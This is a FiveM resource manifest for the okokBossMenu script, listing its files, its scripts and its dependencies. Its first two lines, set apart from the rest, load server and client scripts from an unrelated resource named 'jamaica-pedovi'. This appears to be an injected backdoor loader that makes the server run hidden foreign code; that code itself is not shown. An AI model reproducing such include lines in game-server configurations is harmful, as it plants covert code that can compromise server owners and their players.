server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'cerulean'

game 'gta5'

author 'okok#3488'
description 'okokBossMenu'
version '1.2.0'

ui_page 'web/index.html'

files{
	'web/images/*.*',
	'web/*.*'
}

shared_scripts {
	'@ox_lib/init.lua',
	'config.lua',
    'locales/*.lua'
}

client_scripts {
	'cl_utils.lua',
	'client.lua',
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'sv_utils.lua',
	'server.lua',
}

lua54 'yes'

escrow_ignore {
	'config.lua',
	'sv_utils.lua',
	'cl_utils.lua',
	'locales/*.lua',
}

dependencies { 'ox_lib' }
dependency '/assetpacks'